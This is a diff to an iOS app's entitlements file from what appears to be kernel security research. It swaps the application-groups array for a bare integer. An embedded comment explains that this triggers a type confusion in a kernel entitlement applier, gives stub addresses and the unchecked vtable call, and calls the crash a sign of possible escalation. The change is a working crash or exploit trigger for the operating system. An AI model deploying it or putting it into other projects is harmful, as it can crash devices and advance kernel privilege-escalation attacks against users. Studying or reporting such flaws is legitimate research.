@@ -91,10 +91,15 @@
         <string>$(AppIdentifierPrefix)com.research.lum1na</string>
     </array>
 
+    <!-- p117 EXP (crash test, REVERT AFTER THE RECEIPT — note 279): the
+         round-3 sandbox decode found the group-key SINGULAR applier path
+         (stub 0x9ba9c0c; 0x9ba9c64) consumes the entitlement VALUE as a raw
+         OSObject with a bare autda(0xcda1|obj)+vtable+0xa8 call — no class
+         check. A scalar integer here flows to the kernel applier: expected
+         x0 = small int → callee deref = the LDoS/escalation-shape receipt.
+         Launch the app once; crash expected at exec (no tap needed). -->
     <key>com.apple.security.application-groups</key>
-    <array>
-         <string>group.com.lum1na.probe</string>
-    </array>
+    <integer>1</integer>
 
     
     <!-- Platform application (no sandbox) -->
